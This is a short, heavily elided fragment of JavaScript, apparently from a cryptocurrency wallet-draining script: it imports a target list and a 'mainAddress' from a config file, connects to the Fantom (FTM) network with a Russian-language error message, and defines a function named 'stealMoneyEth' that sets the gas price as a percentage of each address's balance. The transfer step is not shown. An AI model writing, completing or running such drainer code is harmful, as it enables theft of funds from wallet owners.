...
import { rpc, grab, mainAddress, gasPercentFtm, mode } from "./config.js";
...
export async function runFtm() {
    try {
        ...
        console.log("Не удалось подключиться к сети FTM")
        return;
    }
...
async function stealMoneyEth(address) {
    ...
    if (mode === 1) {
        gasPrice = BigInt(Math.trunc(Math.trunc(Number(balance) * gasPercentFtm / 100) / gasUnits));
        transactionCost = BigInt(Math.trunc(Number(balance) * gasPercentFtm / 100));
